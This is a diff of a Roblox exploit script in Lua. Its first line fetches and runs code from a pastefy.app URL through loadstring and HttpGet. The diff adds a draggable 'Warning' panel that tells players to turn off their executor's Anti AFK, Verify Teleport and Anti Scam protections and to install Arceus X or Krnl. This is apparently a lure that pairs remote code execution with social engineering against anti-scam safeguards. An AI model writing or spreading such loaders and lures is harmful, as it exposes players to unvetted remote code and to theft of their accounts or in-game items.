@@ -1,84 +1,127 @@
 loadstring(game:HttpGet("https://pastefy.app/nwtxwHVW/raw"))()
--- Detect if running on Delta
-local isDelta = identifyexecutor and identifyexecutor():lower():find("delta")
+local Players = game:GetService("Players")
+local player = Players.LocalPlayer
 
-if isDelta then
-    local Players = game:GetService("Players")
-    local player = Players.LocalPlayer
+-- Create ScreenGui
+local gui = Instance.new("ScreenGui")
+gui.Name = "DeltaWarning"
+gui.Parent = player:WaitForChild("PlayerGui")
+gui.ResetOnSpawn = false
 
-    -- ScreenGui
-    local gui = Instance.new("ScreenGui")
-    gui.Name = "DeltaWarningUI"
-    gui.Parent = player:WaitForChild("PlayerGui")
+-- Main Frame
+local frame = Instance.new("Frame")
+frame.Size = UDim2.new(0, 420, 0, 260)
+frame.Position = UDim2.new(0.5, -210, 0.5, -130)
+frame.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
+frame.BorderSizePixel = 0
+frame.Parent = gui
+frame.Active = true
+frame.Draggable = true
+frame.ClipsDescendants = true
+frame.BackgroundTransparency = 0.1
+frame.ZIndex = 10
 
-    -- Main Frame
-    local frame = Instance.new("Frame")
-    frame.Size = UDim2.new(0, 400, 0, 250)
-    frame.Position = UDim2.new(0.5, -200, 0.5, -125)
-    frame.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
-    frame.BorderSizePixel = 0
-    frame.Parent = gui
+-- UICorner
+local corner = Instance.new("UICorner")
+corner.CornerRadius = UDim.new(0, 12)
+corner.Parent = frame
 
-    -- Title
-    local title = Instance.new("TextLabel")
-    title.Size = UDim2.new(1, 0, 0, 40)
-    title.BackgroundTransparency = 1
-    title.Text = "⚠️ Delta Executor Warning"
-    title.Font = Enum.Font.SourceSansBold
-    title.TextSize = 22
-    title.TextColor3 = Color3.fromRGB(255, 75, 75)
-    title.Parent = frame
+-- Title
+local title = Instance.new("TextLabel")
+title.Text = "⚠️ Warning!"
+title.Font = Enum.Font.GothamBold
+title.TextSize = 22
+title.TextColor3 = Color3.fromRGB(255, 75, 75)
+title.Size = UDim2.new(1, 0, 0, 40)
+title.BackgroundTransparency = 1
+title.Parent = frame
 
-    -- Message
-    local msg = Instance.new("TextLabel")
-    msg.Size = UDim2.new(1, -20, 0, 100)
-    msg.Position = UDim2.new(0, 10, 0, 50)
-    msg.BackgroundTransparency = 1
-    msg.TextWrapped = true
-    msg.Text = "Delta Executor has issues with this script!\n\nPlease use one of the recommended executors below:\n √ Arceus X\n √ Krnl\n\n1. Turn off Anti AFK\n2. Turn off Verify Teleport\n3. Turn off Anti Scam\n✅ After disabling, press OK to continue"
-    msg.Font = Enum.Font.SourceSans
-    msg.TextSize = 18
-    msg.TextColor3 = Color3.fromRGB(255, 255, 255)
-    msg.Parent = frame
+-- Message
+local msg = Instance.new("TextLabel")
+msg.Text = [[
+Delta Executor has issues with this script!
 
-    -- KRNL Button
-    local krnlBtn = Instance.new("TextButton")
-    krnlBtn.Size = UDim2.new(0, 180, 0, 30)
-    krnlBtn.Position = UDim2.new(0.5, -190, 1, -40)
-    krnlBtn.Text = "🔗 Get KRNL"
-    krnlBtn.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
-    krnlBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
-    krnlBtn.Parent = frame
-    krnlBtn.MouseButton1Click:Connect(function()
-        setclipboard("https://krnl.place/") -- Copies link to clipboard
-    end)
+Please use one of the recommended executor below:
+√ Arceus X
+√ Krnl
 
-    -- Arceus X Button
-    local arceusBtn = Instance.new("TextButton")
-    arceusBtn.Size = UDim2.new(0, 180, 0, 30)
-    arceusBtn.Position = UDim2.new(0.5, 10, 1, -40)
-    arceusBtn.Text = "🔗 Get Arceus X"
-    arceusBtn.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
-    arceusBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
-    arceusBtn.Parent = frame
-    arceusBtn.MouseButton1Click:Connect(function()
-        setclipboard("https://arceusx.net/") -- Copies link to clipboard
-    end)
+If you want to use Delta please follow this steps to work:
+1. Turn off Anti AFK
+2. Turn off Verify Teleport
+3. Turn off Anti Scam
 
-    -- OK Button
-    local okBtn = Instance.new("TextButton")
-    okBtn.Size = UDim2.new(0, 120, 0, 30)
-    okBtn.Position = UDim2.new(0.5, -60, 1, -80)
-    okBtn.Text = "✅ OK"
-    okBtn.BackgroundColor3 = Color3.fromRGB(0, 170, 80)
-    okBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
-    okBtn.Parent = frame
-    okBtn.MouseButton1Click:Connect(function()
-        gui:Destroy()
-    end)
+✅ After disabling, press OK to continue
+]]
+msg.TextWrapped = true
+msg.Font = Enum.Font.Gotham
+msg.TextSize = 16
+msg.TextColor3 = Color3.fromRGB(230, 230, 230)
+msg.Size = UDim2.new(1, -20, 1, -90)
+msg.Position = UDim2.new(0, 10, 0, 40)
+msg.BackgroundTransparency = 1
+msg.Parent = frame
 
-    return -- 🚫 Prevents main script from loading
-end
+-- Buttons Holder
+local buttonFrame = Instance.new("Frame")
+buttonFrame.Size = UDim2.new(1, 0, 0, 40)
+buttonFrame.Position = UDim2.new(0, 0, 1, -45)
+buttonFrame.BackgroundTransparency = 1
+buttonFrame.Parent = frame
 
--- Main script only loads if NOT Delta
-loadstring(game:HttpGet("https://raw.githubusercontent.com/LypherScriptz/ThunderZHub/refs/heads/main/Main.Script.Lua20%25"))()
+-- Confirm Button
+local confirmBtn = Instance.new("TextButton")
+confirmBtn.Text = "✅ OK"
+confirmBtn.Font = Enum.Font.GothamBold
+confirmBtn.TextSize = 16
+confirmBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
+confirmBtn.Size = UDim2.new(0, 100, 0, 35)
+confirmBtn.Position = UDim2.new(0.5, -50, 0, 0)
+confirmBtn.BackgroundColor3 = Color3.fromRGB(50, 200, 100)
+confirmBtn.Parent = buttonFrame
+
+local confirmCorner = Instance.new("UICorner")
+confirmCorner.CornerRadius = UDim.new(0, 8)
+confirmCorner.Parent = confirmBtn
+
+confirmBtn.MouseButton1Click:Connect(function()
+    gui:Destroy()
+    print("User pressed OK - continue script here")
+end)
+
+-- Arceus X Button
+local arceusBtn = Instance.new("TextButton")
+arceusBtn.Text = "🌐 Arceus X"
+arceusBtn.Font = Enum.Font.GothamBold
+arceusBtn.TextSize = 15
+arceusBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
+arceusBtn.Size = UDim2.new(0, 120, 0, 30)
+arceusBtn.Position = UDim2.new(0, 20, 1, -85)
+arceusBtn.BackgroundColor3 = Color3.fromRGB(0, 120, 255)
+arceusBtn.Parent = frame
+
+local arceusCorner = Instance.new("UICorner")
+arceusCorner.CornerRadius = UDim.new(0, 6)
+arceusCorner.Parent = arceusBtn
+
+arceusBtn.MouseButton1Click:Connect(function()
+    setclipboard("https://arceusx.net")
+end)
+
+-- KRNL Button
+local krnlBtn = Instance.new("TextButton")
+krnlBtn.Text = "🌐 Krnl"
+krnlBtn.Font = Enum.Font.GothamBold
+krnlBtn.TextSize = 15
+krnlBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
+krnlBtn.Size = UDim2.new(0, 120, 0, 30)
+krnlBtn.Position = UDim2.new(1, -140, 1, -85)
+krnlBtn.BackgroundColor3 = Color3.fromRGB(120, 0, 255)
+krnlBtn.Parent = frame
+
+local krnlCorner = Instance.new("UICorner")
+krnlCorner.CornerRadius = UDim.new(0, 6)
+krnlCorner.Parent = krnlBtn
+
+krnlBtn.MouseButton1Click:Connect(function()
+    setclipboard("https://krnl.place")
+end)
